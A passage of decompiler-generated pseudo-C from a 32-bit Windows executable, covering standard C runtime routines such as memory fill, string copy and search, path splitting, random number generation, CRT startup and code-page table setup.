					dwLoc08_102 = (Eq_4926 (*)[]) (dwLoc08_102 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
				}
				up32 edx_138 = 0x00;
				if (ecx_119->dw0004 > 0x00)
				{
					do
					{
						Mem154[eax_42 + esi_104:byte] = Mem89[eax_42 + esi_104:byte] & 0x00;
						esi_104 = esi_104 + 0x01;
						edx_138 = edx_138 + 0x01;
					} while (edx_138 < ecx_119->dw0004);
				}
				ecx_119 = ecx_119 + 0x01;
				ebx_128 = ebx_128 - 0x01;
			} while (ebx_128 != 0x00);
		}
		Eq_4926 ecx_106[] = dwLoc08_102;
		if (dwLoc08_102 < eax_72 + ~0x03)
		{
			word32 esi_109 = esi_104 + eax_42;
			do
			{
				*esi_109 = (byte) (&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&ecx_106[edi_91].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00];
				esi_109 = esi_109 + 0x01;
				ecx_106 = (Eq_4926 (*)[]) (ecx_106 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
			} while (ecx_106 < eax_72 + ~0x03);
		}
	}
	return eax_42;
}

// 00407310: Register byte fn00407310(Stack Eq_5 dwArg04, Stack byte bArg08, Stack Eq_5 dwArg0C)
byte fn00407310(Eq_5 dwArg04, byte bArg08, Eq_5 dwArg0C)
{
	Eq_5 edx_3 = dwArg0C;
	byte dl_4 = (byte) dwArg0C;
	if (dwArg0C == 0x00)
		return dl_4;
	byte dl_36;
	byte al_24 = bArg08;
	ui32 eax_25 = (word32) bArg08;
	Eq_5 edi_29 = dwArg04;
	if (dwArg0C >= 0x04)
	{
		ui32 ecx_56 = -dwArg04;
		ui32 ecx_57 = ecx_56 & 0x03;
		if ((ecx_56 & 0x03) != 0x00)
		{
			edx_3 = dwArg0C - (ecx_56 & 0x03);
			do
			{
				*edi_29 = bArg08;
				edi_29 = (word32) edi_29 + 0x01;
				ecx_57 = ecx_57 - 0x01;
			} while (ecx_57 != 0x00);
		}
		Eq_5001 eax_69 = eax_25 * 0x01010000 + eax_25 * 0x0101;
		edx_3 = edx_3 & 0x03;
		al_24 = (byte) eax_69;
		dl_36 = (byte) edx_3;
		uint32 ecx_74 = edx_3 >> 0x02;
		if (ecx_74 != 0x00)
		{
			while (ecx_74 != 0x00)
			{
				*edi_29 = eax_69;
				edi_29 = (word32) edi_29 + 0x04;
				ecx_74 = ecx_74 - 0x01;
			}
			if (edx_3 == 0x00)
				return dl_36;
		}
	}
	do
	{
		*edi_29 = al_24;
		edx_3 = edx_3 - 0x01;
		edi_29 = (word32) edi_29 + 0x01;
		dl_36 = (byte) edx_3;
	} while (edx_3 != 0x00);
	return dl_36;
}

// 00407370: Register word32 fn00407370(Stack Eq_5 dwArg04, Register out (ptr32 Eq_8661) ediOut)
word32 fn00407370(Eq_5 dwArg04, CHAR * & ediOut)
{
	word32 edi_7;
	return fn004073E1(dwArg04, out edi_7);
}

// 00407380: Register word32 fn00407380(Stack Eq_5 dwArg04)
word32 fn00407380(Eq_5 dwArg04)
{
	Eq_5 ecx_28 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		do
		{
			ecx_28 = (word32) ecx_28 + 0x01;
			if (*ecx_28 == 0x00)
				goto l004073CF;
		} while ((ecx_28 & 0x03) != 0x00);
	}
	do
	{
		do
		{
			word32 eax_36 = *ecx_28;
			ecx_28 = (word32) ecx_28 + 0x04;
		} while (((eax_36 ^ ~0x00 ^ eax_36 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_45 = *(ecx_28 - 0x04);
		byte ah_47 = SLICE(eax_45, byte, 8);
		if ((byte) eax_45 == 0x00)
		{
			word32 edi_67;
			fn004073E1(ecx_28 - 0x04, out edi_67);
			return edi_67;
		}
		if (ah_47 == 0x00)
		{
			word32 edi_64;
			fn004073E1(ecx_28 - 0x03, out edi_64);
			return edi_64;
		}
		if ((eax_45 & 0x00FF0000) == 0x00)
		{
			word32 edi_61;
			fn004073E1(ecx_28 - 0x02, out edi_61);
			return edi_61;
		}
	} while ((eax_45 & 0xFF000000) != 0x00);
l004073CF:
	Eq_5 edi_29 = ecx_28 - 0x01;
	word32 edi_30;
	fn004073E1(edi_29, out edi_30);
	return edi_30;
}

// 004073E1: Register (ptr32 byte) fn004073E1(Register Eq_5 edi, Register out ptr32 ediOut)
byte * fn004073E1(Eq_5 edi, ptr32 & ediOut)
{
	byte dl_25;
	byte * ecx_28 = v3->ptr000C;
	if ((ecx_28 & 0x03) != 0x00)
	{
		do
		{
			dl_25 = *ecx_28;
			ecx_28 = ecx_28 + 0x01;
			if (dl_25 == 0x00)
				goto l00407458;
			*edi = dl_25;
			edi = (word32) edi + 0x01;
		} while ((ecx_28 & 0x03) != 0x00);
	}
l00407406:
	Eq_5151 edx_46 = *ecx_28;
	Eq_5155 eax_42 = *ecx_28;
	dl_25 = (byte) edx_46;
	byte dh_48 = SLICE(edx_46, byte, 8);
	Eq_5162 dx_49 = (word16) edx_46;
	ecx_28 = ecx_28 + 0x04;
	if (((eax_42 ^ ~0x00 ^ (word32) eax_42 + 0x7EFEFEFF) & 0x81010100) != 0x00)
	{
		if (dl_25 == 0x00)
		{
l00407458:
			*edi = dl_25;
			word32 edi_36;
			*ediOut = v3->dw0000;
			return ecx_28;
		}
		if (dh_48 == 0x00)
		{
			*edi = dx_49;
			word32 edi_83;
			*ediOut = v3->dw0000;
			return ecx_28;
		}
		if ((edx_46 & 0x00FF0000) == 0x00)
		{
			*edi = dx_49;
			*((word32) edi + 0x02) = 0x00;
			word32 edi_79;
			*ediOut = v3->dw0000;
			return ecx_28;
		}
		if ((edx_46 & 0xFF000000) == 0x00)
		{
			*edi = edx_46;
			word32 edi_74;
			*ediOut = v3->dw0000;
			return ecx_28;
		}
	}
	*edi = edx_46;
	edi = (word32) edi + 0x04;
	goto l00407406;
}

// 00407460: Register ptr32 fn00407460(Stack Eq_5 dwArg04, Register out Eq_12 dlOut)
ptr32 fn00407460(Eq_5 dwArg04, Eq_12 & dlOut)
{
	*dlOut = dl;
	Eq_5 ecx_27 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		do
		{
			ecx_27 = (word32) ecx_27 + 0x01;
			if (*ecx_27 == 0x00)
				return ecx_27 - 0x01 - dwArg04;
		} while ((ecx_27 & 0x03) != 0x00);
	}
	do
	{
		do
		{
			word32 eax_39 = *ecx_27;
			byte dl_42 = (byte) (eax_39 + 0x7EFEFEFF);
			*dlOut = dl_42;
			ecx_27 = (word32) ecx_27 + 0x04;
		} while (((eax_39 ^ ~0x00 ^ eax_39 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_49 = *(ecx_27 - 0x04);
		byte ah_51 = SLICE(eax_49, byte, 8);
		if ((byte) eax_49 == 0x00)
			return ecx_27 - 0x04 - dwArg04;
		if (ah_51 == 0x00)
			return ecx_27 - 0x03 - dwArg04;
		if ((eax_49 & 0x00FF0000) == 0x00)
			return ecx_27 - 0x02 - dwArg04;
	} while ((eax_49 & 0xFF000000) != 0x00);
	return ecx_27 - 0x01 - dwArg04;
}

// 004074DB: Register Eq_5 fn004074DB(Register Eq_5 ecx, Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C, Stack Eq_5 dwArg10, Stack Eq_5 dwArg14)
Eq_5 fn004074DB(Eq_5 ecx, Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C, Eq_5 dwArg10, Eq_5 dwArg14)
{
	Eq_5 dwLoc08_10 = ecx & 0x00;
	Eq_5 ebx_17 = dwArg04;
	Eq_5 ecx_118 = dwArg04;
	byte dl_26;
	if (fn00407460(dwArg04, out dl_26) >= 0x01 && *((word32) dwArg04 + 0x01) == 0x3A)
	{
		if (dwArg08 != 0x00)
		{
			ecx_118 = fn00408597(dwArg08, dwArg04, (Eq_5345 (*)[]) 0x02);
			*((word32) dwArg08 + 0x02) = *((word32) dwArg08 + 0x02) & 0x00;
		}
		ebx_17 = (word32) dwArg04 + 0x02;
	}
	else if (dwArg08 != 0x00)
		*dwArg08 = *dwArg08 & 0x00;
	Eq_5 dwArg08_199 = dwArg08 & 0x00;
	Eq_5 eax_130 = ebx_17;
	Eq_5345 (* esi_111)[] = (Eq_5345 (*)[]) 0xFF;
	Eq_5 dwArg04_185 = ebx_17;
	if (*ebx_17 != 0x00)
	{
		do
		{
			byte cl_204 = *eax_130;
			ecx_118 = DPB(ecx_118, cl_204, 0);
			if ((((word32) cl_204)->b4932E1 & 0x04) != 0x00)
				eax_130 = (word32) eax_130 + 0x01;
			else if (cl_204 != 0x2F && cl_204 != 0x5C)
			{
				if (cl_204 == 0x2E)
					dwLoc08_10 = eax_130;
			}
			else
			{
				ecx_118 = (word32) eax_130 + 0x01;
				dwArg08_199 = ecx_118;
			}
			eax_130 = (word32) eax_130 + 0x01;
		} while (*eax_130 != 0x00);
		dwArg04_185 = eax_130;
		if (dwArg08_199 != 0x00)
		{
			if (dwArg0C != 0x00)
			{
				Eq_5345 (* edi_238)[] = dwArg08_199 - ebx_17;
				if (edi_238 >= (Eq_5345 (*)[]) 0xFF)
					edi_238 = (Eq_5345 (*)[]) 0xFF;
				ecx_118 = fn00408597(dwArg0C, ebx_17, edi_238);
				Mem254[edi_238 + dwArg0C:byte] = Mem0[edi_238 + dwArg0C:byte] & 0x00;
			}
			ebx_17 = dwArg08_199;
l004075A2:
			if (dwLoc08_10 != 0x00 && dwLoc08_10 >= ebx_17)
			{
				if (dwArg10 != 0x00)
				{
					Eq_5345 (* edi_161)[] = dwLoc08_10 - ebx_17;
					if (edi_161 >= (Eq_5345 (*)[]) 0xFF)
						edi_161 = (Eq_5345 (*)[]) 0xFF;
					ecx_118 = fn00408597(dwArg10, ebx_17, edi_161);
					Mem177[edi_161 + dwArg10:byte] = Mem0[edi_161 + dwArg10:byte] & 0x00;
					eax_130 = dwArg04_185;
				}
				if (dwArg14 != 0x00)
				{
					Eq_5345 (* eax_142)[] = eax_130 - dwLoc08_10;
					if (eax_142 < (Eq_5345 (*)[]) 0xFF)
						esi_111 = eax_142;
					ecx_118 = fn00408597(dwArg14, dwLoc08_10, esi_111);
					Mem157[esi_111 + dwArg14:byte] = Mem0[esi_111 + dwArg14:byte] & 0x00;
				}
			}
			else
			{
				if (dwArg10 != 0x00)
				{
					Eq_5345 (* eax_108)[] = eax_130 - ebx_17;
					if (eax_108 < (Eq_5345 (*)[]) 0xFF)
						esi_111 = eax_108;
					ecx_118 = fn00408597(dwArg10, ebx_17, esi_111);
					Mem122[esi_111 + dwArg10:byte] = Mem0[esi_111 + dwArg10:byte] & 0x00;
				}
				if (dwArg14 != 0x00)
					*dwArg14 = *dwArg14 & 0x00;
			}
			return ecx_118;
		}
	}
	ecx_118 = dwArg0C;
	if (dwArg0C != 0x00)
		*dwArg0C = *dwArg0C & 0x00;
	goto l004075A2;
}

// 004076EE: Register Eq_5469 fn004076EE(Register Eq_5 ecx, Stack Eq_5469 dwArg04, Stack byte bArg05, Stack byte bArg06, Register out ptr32 ecxOut, Register out Eq_5475 dlOut)
Eq_5469 fn004076EE(Eq_5 ecx, Eq_5469 dwArg04, byte bArg05, byte bArg06, ptr32 & ecxOut, Eq_5475 & dlOut)
{
	*ecxOut = ecx;
	*dlOut = dl;
	Eq_5469 eax_112;
	if (globals->t491ED4 == 0x00)
	{
		eax_112 = dwArg04;
		if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
			eax_112 = (word32) dwArg04.u0 + 0x0020;
		return eax_112;
	}
	if (dwArg04 < 0x0100)
	{
		ui32 eax_198;
		if (globals->dw4113BC > 0x01)
		{
			byte dl_209;
			eax_198 = fn00408870(dwArg04, SLICE(dwArg04, word16, 16), 0x01, out dl_209);
			word32 ecx_214;
			*ecxOut = 0x01;
		}
		else
		{
			Eq_12507 eax_216[] = globals->ptr4111B0;
			eax_198 = DPB(eax_216, eax_216[dwArg04].t0000, 0) & 0x01;
		}
		if (eax_198 == 0x00)
		{
l0040774B:
			eax_112 = dwArg04;
			return eax_112;
		}
	}
	Eq_5492 eax_131;
	if ((globals->ptr4111B0[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
		eax_131.u0 = 0x02;
	else
		eax_131.u0 = 0x01;
	word32 ecx_152;
	byte dl_153;
	Eq_5 eax_154 = fn00408621(fp - 0x04, globals->t491ED4, 0x0100, 0x01, fp + 0x04, eax_131, fp - 0x08, 0x03, 0x00, 0x01, out ecx_152, out dl_153);
	if (eax_154 != 0x00)
	{
		if (eax_154 == 0x01)
			eax_112 = (word32) bLoc08;
		else
		{
			ui32 ecx_167 = (word32) bLoc08;
			*ecxOut = ecx_167;
			eax_112 = (word32) bLoc07 << 0x08 | ecx_167;
		}
		return eax_112;
	}
	goto l0040774B;
}

// 0040780B: Register Eq_5 fn0040780B(Register Eq_5 ebp, Stack Eq_5 dwArg04, Register out ptr32 ediOut)
Eq_5 fn0040780B(Eq_5 ebp, Eq_5 dwArg04, ptr32 & ediOut)
{
	Eq_5 ebp_7;
	word32 edi_8;
	fn00409204(ebp, dwArg04, out ebp_7, out edi_8);
	return ebp_7;
}

// 00407820: Register word32 fn00407820(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C, Register out ptr32 esiOut, Register out Eq_3476 ediOut)
word32 fn00407820(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C, ptr32 & esiOut, Eq_3476 & ediOut)
{
}

// 00407B55: void fn00407B55(Stack Eq_5 dwArg04)
void fn00407B55(Eq_5 dwArg04)
{
	globals->t4110A0 = dwArg04;
}

// 00407B5F: Register ui32 fn00407B5F()
ui32 fn00407B5F()
{
	Eq_5 eax_5 = globals->t4110A0 *s 0x000343FD + 2531011;
	globals->t4110A0 = eax_5;
	return eax_5 >> 0x10 & 0x7FFF;
}

// 00407B80: void fn00407B80(Register uint32 eax, Stack ptr32 dwArg00)
void fn00407B80(uint32 eax, ptr32 dwArg00)
{
	ptr32 ecx_10 = fp + 0x04;
	if (eax >= 0x1000)
	{
		do
		{
			ecx_10 = ecx_10 - 0x1000;
			eax = eax - 0x1000;
		} while (eax >= 0x1000);
	}
	*(ecx_10 - eax - 0x04) = dwArg00;
}

// 00407BAF: Register word32 fn00407BAF(Stack Eq_5 dwArg04)
word32 fn00407BAF(Eq_5 dwArg04)
{
	return fn00409245(dwArg04, 0x01);
}

// 00407C00: Register word32 fn00407C00(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C, Register out Eq_5971 esiOut)
word32 fn00407C00(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C, Eq_5971 & esiOut)
{
}

// 00407FC0: Register Eq_5 fn00407FC0(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
Eq_5 fn00407FC0(Eq_5 dwArg04, Eq_5 dwArg08)
{
	byte dl_15 = *dwArg08;
	Eq_5 edi_19 = dwArg04;
	if (dl_15 == 0x00)
		return dwArg04;
	byte dh_43 = *((word32) dwArg08 + 0x01);
	if (dh_43 == 0x00)
	{
		ui32 eax_159 = (word32) dl_15;
		byte bl_163 = (byte) eax_159;
		Eq_5 edx_167 = dwArg04;
		if ((dwArg04 & 0x03) != 0x00)
		{
			do
			{
				byte cl_324 = *edx_167;
				edx_167 = (word32) edx_167 + 0x01;
				if (cl_324 == bl_163)
					return edx_167 - 0x01;
				if (cl_324 == 0x00)
					return 0x00;
			} while ((edx_167 & 0x03) != 0x00);
		}
		ui32 ebx_200 = eax_159 | eax_159 << 0x08;
		ui32 ebx_207 = ebx_200 << 0x10 | ebx_200;
		byte bl_208 = (byte) ebx_207;
		while (true)
		{
			while (true)
			{
				Eq_6404 ecx_213 = *edx_167;
				ui32 ecx_217 = ecx_213 ^ ebx_207;
				ui32 eax_223 = ecx_213 ^ ~0x00 ^ (word32) ecx_213 + 0x7EFEFEFF;
				edx_167 = (word32) edx_167 + 0x04;
				if (((ecx_217 ^ ~0x00 ^ ecx_217 + 0x7EFEFEFF) & 0x81010100) != 0x00)
					break;
				if ((eax_223 & 0x81010100) != 0x00 && (((eax_223 & 0x81010100) & 0x01010100) != 0x00 || ((word32) ecx_213 + 0x7EFEFEFF & 0x80000000) == 0x00))
					return 0x00;
			}
			uint32 eax_258 = *(edx_167 - 0x04);
			byte al_259 = (byte) eax_258;
			byte ah_260 = SLICE(eax_258, byte, 8);
			if (al_259 == bl_208)
				break;
			if (al_259 == 0x00)
				return 0x00;
			if (ah_260 == bl_208)
				return edx_167 - 0x03;
			if (ah_260 == 0x00)
				return 0x00;
			byte al_272 = (byte) (eax_258 >> 0x10);
			byte ah_273 = SLICE(eax_258 >> 0x10, byte, 8);
			if (al_272 == bl_208)
				return edx_167 - 0x02;
			if (al_272 == 0x00)
				return 0x00;
			if (ah_273 == bl_208)
				return edx_167 - 0x01;
			if (ah_273 == 0x00)
				return 0x00;
		}
		return edx_167 - 0x04;
	}
l00407FD8:
	byte al_128;
	Eq_5 ecx_122 = dwArg08;
	byte al_58 = *edi_19;
	union Eq_6303 * esi_126 = (word32) edi_19 + 0x01;
	if (al_58 != dl_15)
	{
		if (al_58 == 0x00)
			return 0x00;
l00407FE9:
		al_128 = (byte) *esi_126;
		esi_126 = (union Eq_6303 *) ((char *) esi_126 + 0x01);
l00407FEC:
		if (al_128 != dl_15)
		{
			if (al_128 == 0x00)
				return 0x00;
			goto l00407FE9;
		}
	}
	al_128 = (byte) *esi_126;
	esi_126 = (union Eq_6303 *) ((char *) esi_126 + 0x01);
	if (al_128 == dh_43)
	{
		edi_19 = esi_126 - 0x01;
		esi_112 = esi_126;
		do
		{
			union Eq_6303 * esi_112;
			byte ah_93 = *((word32) ecx_122 + 0x02);
			if (ah_93 == 0x00)
				return esi_126 - 0x02;
			esi_112 = (union Eq_6303 *) ((char *) esi_112 + 0x02);
			if (*esi_112 != ah_93)
				break;
			byte al_115 = *((word32) ecx_122 + 0x03);
			if (al_115 == 0x00)
				return esi_126 - 0x02;
			ecx_122 = (word32) ecx_122 + 0x02;
		} while (al_115 == *(esi_112 - 0x01));
		goto l00407FD8;
	}
	goto l00407FEC;
}

// 00408040: Register Eq_5 fn00408040(Stack Eq_5 dwArg04, Stack (ptr32 byte) dwArg08, Stack Eq_5 dwArg0C)
Eq_5 fn00408040(Eq_5 dwArg04, byte * dwArg08, Eq_5 dwArg0C)
{
	Eq_5 ecx_16 = dwArg0C;
	if (dwArg0C == 0x00)
		return ecx_16;
	Eq_5 edi_40 = dwArg04;
	while (ecx_16 != 0x00)
	{
		edi_40 = (word32) edi_88 + 0x01;
		ecx_16 = ecx_16 - 0x01;
		Eq_5 edi_88 = edi_40;
		if (0x00 != *edi_88)
			break;
	}
	word32 ecx_53 = (word32) dwArg0C + -ecx_16;
	Eq_5 edi_55 = dwArg04;
	byte * esi_57 = dwArg08;
	while (ecx_53 != 0x00)
	{
		esi_57 = esi_57 + 0x01;
		edi_55 = (word32) edi_55 + 0x01;
		ecx_53 = ecx_53 - 0x01;
		if (*esi_57 == *edi_55)
			break;
	}
	cu8 al_66 = *(esi_57 - 0x01);
	ecx_16.u0 = 0x00;
	if (al_66 <= *(edi_55 - 0x01))
	{
		if (al_66 == *(edi_55 - 0x01))
			return ecx_16;
		ecx_16.u0 = ~0x01;
	}
	ecx_16 = ~ecx_16;
	return ecx_16;
}

// 00408078: Register Eq_5 Win32CrtStartup()
Eq_5 Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	Eq_5 eax_29 = GetVersion();
	word32 edx_33 = (word32) SLICE(eax_29, byte, 8);
	globals->dw491F04 = edx_33;
	globals->dw491F00 = eax_29 & 0xFF;
	globals->dw491EFC = ((eax_29 & 0xFF) << 0x08) + edx_33;
	globals->dw491EF8 = eax_29 >> 0x10;
	if (fn0040A6ED(0x00) == 0x00)
		fn00408193(fp - 0x04, edi, 0x1C);
	word32 eax_109;
	ui32 ecx_57 = fn0040A542(fp - 0x04, edi);
	globals->t4933E8 = GetCommandLineA();
	globals->t491EB8 = fn0040A410(ecx_57);
	fn0040A1C3(ecx_57);
	fn0040A10A(ebx, fp - 0x04);
	fn00409E2C();
	*(fp - 0x34) = 0x00;
	*(fp - 0x7C) = fp - 0x60;
	GetStartupInfoA(*(fp - 0x7C));
	*(fp - 0x68) = fn0040A0B2();
	if ((*(fp - 0x34) & 0x01) != 0x00)
		eax_109 = (word32) *(fp - 0x30);
	else
	{
		*(fp - 0x7C) = 0x0A;
		eax_109 = *(fp - 0x7C);
	}
	*(fp - 0x7C) = eax_109;
	*(fp - 0x80) = *(fp - 0x68);
	*(fp - 0x84) = 0x00;
	*(fp - 0x88) = 0x00;
	*(fp - 0x88) = (union Eq_5 *) GetModuleHandleA(*(fp - 0x88));
	word32 edi_88;
	word32 eax_89 = fn0040700C(fp - 0x04, out edi_88);
	*(fp - 100) = eax_89;
	*(fp - 0x7C) = eax_89;
	fn00409E59(edi_88, dwArg00);
	word32 ** eax_95 = *(fp - 0x18);
	word32 ecx_97 = **eax_95;
	*(fp - 0x6C) = ecx_97;
	*(fp - 0x80) = eax_95;
	*(fp - 0x84) = ecx_97;
	return fn00409F2E(dwArg00, dwArg04);
}

// 0040816E: Register word32 fn0040816E(Register Eq_5 ebp, Register Eq_5 edi, Stack Eq_5 dwArg04, Register out (ptr32 Eq_8661) ediOut)
word32 fn0040816E(Eq_5 ebp, Eq_5 edi, Eq_5 dwArg04, CHAR * & ediOut)
{
	if (globals->dw491EC0 == 0x01)
		edi = fn0040A8FC(ebp, edi);
	Eq_5 edi_12 = fn0040A935(ebp, edi, dwArg04);
	word32 esp_15;
	byte SCZO_16;
	bool Z_17;
	word32 ecx_18;
	word32 ebp_19;
	word32 edi_20;
	word32 esi_21;
	globals->ptr4110B0();
	return esi_21;
}

// 00408193: void fn00408193(Register Eq_5 ebp, Register Eq_5 edi, Stack Eq_5 dwArg04)
void fn00408193(Eq_5 ebp, Eq_5 edi, Eq_5 dwArg04)
{
	if (globals->dw491EC0 == 0x01)
		edi = fn0040A8FC(ebp, edi);
	fn0040A935(ebp, edi, dwArg04);
	ExitProcess(0xFF);
}

// 004081B7: void fn004081B7(Stack Eq_473 dwArg04)
void fn004081B7(Eq_473 dwArg04)
{
	Eq_473 eax_21 = fn00408350(dwArg04);
	if (eax_21 == globals->t4931B8)
		return;
	if (eax_21 != 0x00)
	{
		ui32 edx_111 = 0x00;
		union Eq_473 * eax_115 = globals->a4110C0;
		do
		{
			if (*eax_115 == eax_21)
			{
				word32 ecx_258 = 0x40;
				struct Eq_6811 * edi_260 = globals->a4932E0;
				while (ecx_258 != 0x00)
				{
					edi_260->b0000 = (byte) 0x00;
					edi_260 = edi_260 + 0x01;
					ecx_258 = ecx_258 - 0x01;
				}
				edi_260->b0000 = 0x00;
				ui32 esi_266 = edx_111 * 0x03;
				byte * dwLoc08_267 = globals->a4110B8;
				struct Eq_6952 * ebx_272 = (esi_266 << 0x04) + 4264144;
				do
				{
					byte * ecx_285 = &ebx_272->b0000 + 0x01;
					if (ebx_272->b0000 != 0x00)
					{
						do
						{
							byte dl_330 = *ecx_285;
							if (dl_330 == 0x00)
								break;
							struct Eq_6981 * eax_335 = (word32) *ecx_285;
							struct Eq_6981 * edi_337 = (word32) dl_330;
							if (eax_335 <= edi_337)
							{
								byte dl_351 = *dwLoc08_267;
								do
								{
									eax_335[4797153] = (struct Eq_6981) (eax_335[4797153] | dl_351);
									eax_335 = eax_335 + 0x01;
								} while (eax_335 <= edi_337);
							}
							struct Eq_6989 * ecx_346 = ecx_285 + 0x01;
							ecx_285 = (byte *) &ecx_346->b0001;
						} while (ecx_346->b0001 != 0x00);
					}
					byte * v22_295 = dwLoc08_267 + 0x01;
					dwLoc08_267 = v22_295;
					ebx_272 = ebx_272 + 0x01;
				} while (v22_295 < (byte *) ~0x004110B3);
				globals->dw4931CC = 0x01;
				globals->t4931B8 = eax_21;
				Eq_5481 eax_305 = fn0040839A(eax_21);
				struct Eq_7027 * esi_306 = (esi_266 << 0x04) + 0x004110C4;
				globals->dw4931C0 = esi_306->dw0000;
				globals->dw4931C4 = esi_306->dw0004;
				globals->t4933E4 = eax_305;
				globals->dw4931C8 = esi_306->dw0008;
				goto l0040833F;
			}
			eax_115 = (union Eq_473 *) ((char *) eax_115 + 0x0030);
			edx_111 = edx_111 + 0x01;
		} while (eax_115 < &globals->ptr4111B0);
		if (GetCPInfo(eax_21, fp - 0x1C) == 0x01)
		{
			globals->t4931B8 = eax_21;
			word32 ecx_144 = 0x40;
			struct Eq_6841 * edi_146 = globals->a4932E0;
			while (ecx_144 != 0x00)
			{
				edi_146->b0000 = (byte) 0x00;
				edi_146 = edi_146 + 0x01;
				ecx_144 = ecx_144 - 0x01;
			}
			edi_146->b0000 = 0x00;
			globals->t4933E4 = 0x00;
			if (dwLoc1C > 0x01)
			{
				if (bLoc16 != 0x00)
				{
					byte * ecx_213 = fp - 0x15;
					do
					{
						byte dl_220 = *ecx_213;
						if (dl_220 == 0x00)
							break;
						struct Eq_6874 * eax_225 = (word32) *(ecx_213 - 0x01);
						struct Eq_6874 * edx_227 = (word32) dl_220;
						while (eax_225 <= edx_227)
						{
							eax_225[4797153] = (struct Eq_6874) (eax_225[4797153] | 0x04);
							eax_225 = eax_225 + 0x01;
						}
						byte * ecx_242 = ecx_213 + 0x01;
						ecx_213 = ecx_242 + 0x01;
					} while (*ecx_242 != 0x00);
				}
				struct Eq_6869 * eax_195 = (struct Eq_6869 *) 0x01;
				do
				{
					eax_195[4797153] = (struct Eq_6869) (eax_195[4797153] | 0x08);
					eax_195 = eax_195 + 0x01;
				} while (eax_195 < (struct Eq_6869 *) 0xFF);
				globals->t4933E4 = fn0040839A(eax_21);
				globals->dw4931CC = 0x01;
			}
			else
				globals->dw4931CC = 0x00;
			globals->dw4931C0 = 0x00;
			globals->dw4931C4 = 0x00;
			globals->dw4931C8 = 0x00;
l0040833F:
			fn004083F6();
			return;
		}
		if (globals->dw491EC4 == 0x00)
			return;
	}
	fn004083CD();
	goto l0040833F;
}

// 00408350: Register Eq_473 fn00408350(Stack Eq_473 dwArg04)
Eq_473 fn00408350(Eq_473 dwArg04)
{
	globals->dw491EC4 = globals->dw491EC4 & 0x00;
	Eq_473 eax_21 = dwArg04;
	if (dwArg04 != ~0x01)
	{
		if (dwArg04 != ~0x02)
		{
			if (dwArg04 == ~0x03)
			{
				eax_21 = globals->t491EE4;
				globals->dw491EC4 = 0x01;
			}
			return eax_21;
		}
		else
		{
			globals->dw491EC4 = 0x01;
			return GetACP();
		}
	}
	else
	{
		globals->dw491EC4 = 0x01;
		return GetOEMCP();
	}
}

// 0040839A: Register word32 fn0040839A(Stack Eq_473 dwArg04)
word32 fn0040839A(Eq_473 dwArg04)
{
	if (dwArg04 == 0x03A4)
		return 0x0411;
	if (dwArg04 == 0x03A8)
		return 0x0804;
	if (dwArg04 == 949)
		return 0x0412;
	if (dwArg04 == 0x03B6)
		return 0x0404;
	return 0x00;
}

// 004083CD: void fn004083CD()
void fn004083CD()
{
	word32 ecx_15 = 0x40;
	struct Eq_7094 * edi_13 = globals->a4932E0;
	while (ecx_15 != 0x00)
	{
		edi_13->b0000 = (byte) 0x00;
		edi_13 = edi_13 + 0x01;
		ecx_15 = ecx_15 - 0x01;
	}
	edi_13->b0000 = 0x00;
	globals->t4931B8.u0 = 0x00;
	globals->dw4931CC = 0x00;
	globals->t4933E4 = 0x00;
	globals->dw4931C0 = 0x00;
	globals->dw4931C4 = 0x00;
	globals->dw4931C8 = 0x00;
}

// 004083F6: void fn004083F6()
void fn004083F6()
{
	if (GetCPInfo(globals->t4931B8, fp - 0x18) == 0x01)
	{
		Eq_7141 eax_65 = 0x00;
		byte al_66 = 0x00;
		do
		{
			*((word32) eax_65 + (fp - 0x0118)) = al_66;
			eax_65 = (word32) eax_65 + 0x01;
			al_66 = (byte) eax_65;
		} while (eax_65 < 0x0100);
		byte al_236 = bLoc12;
		if (bLoc12 != 0x00)
		{
			byte * edx_227 = fp - 0x11;
			do
			{
				Eq_7244 ecx_239 = (word32) *edx_227;
				Eq_7244 eax_241 = (word32) al_236;
				if (eax_241 <= ecx_239)
				{
					word32 ecx_264 = ecx_239 - eax_241;
					union Eq_7247 * edi_265 = (word32) eax_241 + (fp - 0x0118);
					uint32 ecx_269 = ecx_264 + 0x01 >> 0x02;
					while (ecx_269 != 0x00)
					{
						*edi_265 = 0x20202020;
						edi_265 = (union Eq_7247 *) ((char *) edi_265 + 0x04);
						ecx_269 = ecx_269 - 0x01;
					}
					ui32 ecx_280 = ecx_264 + 0x01 & 0x03;
					while (ecx_280 != 0x00)
					{
						*edi_265 = (union Eq_7247 *) 0x20;
						edi_265 = (union Eq_7247 *) ((char *) edi_265 + 0x01);
						ecx_280 = ecx_280 - 0x01;
					}
				}
				byte * edx_251 = edx_227 + 0x01;
				edx_227 = edx_251 + 0x01;
				al_236 = *edx_251;
			} while (al_236 != 0x00);
		}
		byte dl_114;
		fn0040AA88(fp - 0x04, 0x01, fp - 0x0118, 0x0100, fp - 0x0518, globals->t4931B8, globals->t4933E4, 0x00, out dl_114);
		word32 ecx_137;
		byte dl_138;
